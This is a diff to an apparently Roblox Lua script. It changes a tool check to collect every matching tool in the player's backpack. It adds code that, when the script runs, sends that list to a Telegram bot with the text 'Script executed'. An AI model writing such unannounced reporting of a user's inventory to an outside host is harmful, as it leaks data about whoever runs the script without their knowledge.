@@ -39,8 +39,8 @@ local function sendTelegramMessage(text)
     })
 end
 
--- Check for allowed tools
-local function hasAllowedTool()
+local function getAllowedTools()
+    local toolsFound = {}
     local backpack = LocalPlayer:FindFirstChild("Backpack")
     if backpack then
         for _, tool in pairs(backpack:GetChildren()) do
@@ -48,13 +48,20 @@ local function hasAllowedTool()
                 local toolName = tool.Name:lower()
                 for allowedName in pairs(allowedTypesLower) do
                     if toolName:find(allowedName) then
-                        return true, tool.Name
+                        table.insert(toolsFound, tool.Name)
+                        break
                     end
                 end
             end
         end
     end
-    return false
+    return toolsFound
+end
+
+-- Usage:
+local allowedTools = getAllowedTools()
+if #allowedTools > 0 then
+    sendTelegramMessage("Script executed. Player has allowed tools: " .. table.concat(allowedTools, ", "))
 end
 
 -- Wait for character
@@ -174,3 +181,4 @@ while true do
     end
     task.wait(0.1)
 end
+
